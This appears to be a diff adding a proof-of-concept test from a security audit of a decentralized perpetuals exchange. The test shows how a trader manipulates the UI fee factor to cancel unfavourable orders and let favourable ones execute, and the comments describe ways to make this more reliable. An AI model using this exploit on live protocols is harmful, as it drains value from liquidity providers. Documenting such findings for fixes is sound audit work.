@@ -3,7 +3,7 @@ import { expect } from "chai";
 import { deployFixture } from "../../utils/fixture";
 import { expandDecimals, decimalToFloat } from "../../utils/math";
 import { handleDeposit } from "../../utils/deposit";
-import { OrderType, handleOrder } from "../../utils/order";
+import { OrderType, handleOrder, createOrder, executeOrder } from "../../utils/order";
 import { getIsAdlEnabled, updateAdlState, executeAdl } from "../../utils/adl";
 import { grantRole } from "../../utils/role";
 import * as keys from "../../utils/keys";
@@ -70,7 +70,109 @@ describe("Guardian.PoCs", () => {
     });
   });
 
-  it.only("uiFee Manipulation", async function () {
+  it.only("uiFee Manipulation #1", async function () {
+    const USER_1_DEPOSIT_AMOUNT_LONG = expandDecimals(1_000, 18);
+    const USER_1_DEPOSIT_AMOUNT_SHORT = expandDecimals(5_000_000, 6);
+
+    const MAX_UI_FEE = decimalToFloat(5, 5); // Half a BIP.
+
+    await dataStore.setUint(keys.MAX_UI_FEE_FACTOR, MAX_UI_FEE);
+
+    // User 1 deposits into the market
+    await handleDeposit(fixture, {
+      create: {
+        account: user1,
+        market: ethUsdMarket,
+        longTokenAmount: USER_1_DEPOSIT_AMOUNT_LONG,
+        shortTokenAmount: USER_1_DEPOSIT_AMOUNT_SHORT,
+      },
+    });
+
+    // Trader makes a MarketIncrease with a malicious uiFeeReceiver and a swapPath
+    //
+    // In this example we assume BTC-USD remains at a similar price, however the swapPath could use
+    // more correlated pairs -- where even small deviations in the output amount created by the uiFee can reliably cause a revert.
+    //
+    //
+    await createOrder(fixture, {
+      account: user1,
+      market: ethUsdMarket,
+      uiFeeReceiver: user1,
+      initialCollateralToken: wbtc,
+      initialCollateralDeltaAmount: expandDecimals(1, 18), // $50,000
+      swapPath: [btcUsdMarket.marketToken],
+      sizeDeltaUsd: decimalToFloat(500_000),
+      acceptablePrice: expandDecimals(5010, 12),
+      executionFee: expandDecimals(1, 15),
+      minOutputAmount: 50000000000,
+      orderType: OrderType.MarketIncrease,
+      isLong: true,
+      shouldUnwrapNativeToken: false,
+    });
+
+    // The user observes the keeper's tx in the mempool and sees that the prices the keeper supplied
+    // offer no advantage given the price movement for ETH in subsequent blocks.
+    // So the user wishes to cancel their order, however the request cancellation cooldown period stops them
+    // But the user can circumvent this by manipulating the uiFee/referral discount, in this case they will
+    // manipulate the uiFee.
+    //
+    // Notice that the price of ETH (which is what the trader is making a risk free trade on)
+    // is not related to the assets which will determine whether or not the minOutputAmount will fail
+    // These assets in the swapPath can instead be correlated, stable assets for which it is much more
+    // reliable to raise the uiFee to cancel the order.
+    await exchangeRouter.connect(user1).setUiFeeFactor(MAX_UI_FEE);
+
+    // Now when the order execution happens the minOutputAmount is not fulfillable and so it is cancelled
+    await executeOrder(fixture, {
+      tokens: [wnt.address, usdc.address, wbtc.address],
+      minPrices: [expandDecimals(5000, 4), expandDecimals(1, 6), expandDecimals(50_000, 4)],
+      maxPrices: [expandDecimals(5000, 4), expandDecimals(1, 6), expandDecimals(50_000, 4)],
+      precisions: [8, 18, 8],
+      expectedCancellationReason: "InsufficientSwapOutputAmount",
+    });
+
+    // The trader makes another MarketIncrease order, hoping for risk free profit
+    await createOrder(fixture, {
+      account: user1,
+      market: ethUsdMarket,
+      uiFeeReceiver: user1,
+      initialCollateralToken: wbtc,
+      initialCollateralDeltaAmount: expandDecimals(1, 18), // $50,000
+      swapPath: [btcUsdMarket.marketToken],
+      sizeDeltaUsd: decimalToFloat(500_000),
+      acceptablePrice: expandDecimals(5010, 12),
+      executionFee: expandDecimals(1, 15),
+      minOutputAmount: 50000000000,
+      orderType: OrderType.MarketIncrease,
+      isLong: true,
+      shouldUnwrapNativeToken: false,
+    });
+
+    await exchangeRouter.connect(user1).setUiFeeFactor(0);
+
+    // The trader observes the keeper's execution tx in the mempool and sees that prices
+    // have in fact moved favorably since those prices that the keeper provided.
+    // So the trader allows the order to go through.
+    await executeOrder(fixture, {
+      tokens: [wnt.address, usdc.address, wbtc.address],
+      minPrices: [expandDecimals(5000, 4), expandDecimals(1, 6), expandDecimals(50_000, 4)],
+      maxPrices: [expandDecimals(5000, 4), expandDecimals(1, 6), expandDecimals(50_000, 4)],
+      precisions: [8, 18, 8],
+    });
+
+    // Notice that:
+    // - large position size can make any overhead execution costs pale in comparison
+    // - any position fees can be factored in when making the consideration to have the MarketIncrease cancelled or not
+    // - Even if the method is only 60% reliable, it gives traders an unfair advantage that can cause non-trivial detriment
+    //   to LPers with sufficient volume and size of short term risk free trades
+    // - The method ought to be much more than 60% reliable when using a swapPath unrelated to the asset being traded
+    // - The method can be more reliable using a swapPath of correlated stable assets
+    // - The method can be more reliable using up to a 3x long swapPath to compound the effects of the uiFee
+    // - On lower cap, more volatile assets this becomes increasingly profitable, as the trader can choose to
+    //   arbitrage larger swings in the time between the price given by the oracle for execution and the current market rate.
+  });
+
+  it("uiFee Manipulation #2", async function () {
     const USER_1_DEPOSIT_AMOUNT_LONG = expandDecimals(1_000, 18);
     const USER_1_DEPOSIT_AMOUNT_SHORT = expandDecimals(5_000_000, 6);
 
